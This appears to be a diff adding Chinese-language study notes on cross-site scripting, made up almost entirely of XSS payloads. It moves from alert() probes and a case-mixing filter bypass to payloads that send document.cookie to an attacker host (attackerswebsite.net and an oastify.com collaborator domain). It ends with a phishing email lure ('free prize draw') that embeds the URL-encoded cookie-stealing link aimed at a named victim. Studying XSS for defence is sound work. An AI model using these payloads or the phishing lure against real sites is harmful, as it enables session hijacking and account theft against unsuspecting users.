@@ -1,0 +1,44 @@
+跨站脚本攻击 XSS
+
+payload
+
+<script>alert()</script>
+<img src=1 onerror=alert() />
+<a href="javascript:alert()">Click me</a>
+<ScrIpt>alert()</scRipT>
+...
+
+response 
+
+<ScrIpt>alert()</scRipT>
+
+<ScrIpt>alert(document.cookie)</scRipT>
+
+http://shop.com/blog.php?q=%3CScrIpt%3Ealert%28document.cookie%29%3C%2FscRipT%3E
+
+victim 受害者  peter
+
+<ScrIpt>alert(document.cookie)</scRipT>
+
+黑客 hacker
+
+attackerswebsite.net
+
+	<ScrIpt>fetch("http://attackerswebsite.net/?"+document.cookie)</scRipT>
+
+	hacker 监控平台 每隔一段时间 抓取 attackerswebsite.net 请求log
+
+132h1kn5m358mn7kgay9825j3a95xvlk.oastify.com
+
+	<ScrIpt>fetch("http://132h1kn5m358mn7kgay9825j3a95xvlk.oastify.com/?"+document.cookie, {mode: "no-cors"})</scRipT>
+
+钓鱼邮件
+
+某某商城，可以免费抽大奖，<a href="http://shop.com/blog.php?q=%3CScrIpt%3Efetch%28%22http%3A%2F%2F132h1kn5m358mn7kgay9825j3a95xvlk.oastify.com%2F%3F%22%2Bdocument.cookie%2C+%7Bmode%3A+%22no-cors%22%7D%29%3C%2FscRipT%3E">点击查看</a>
+
+peter
+
+
+
+
+
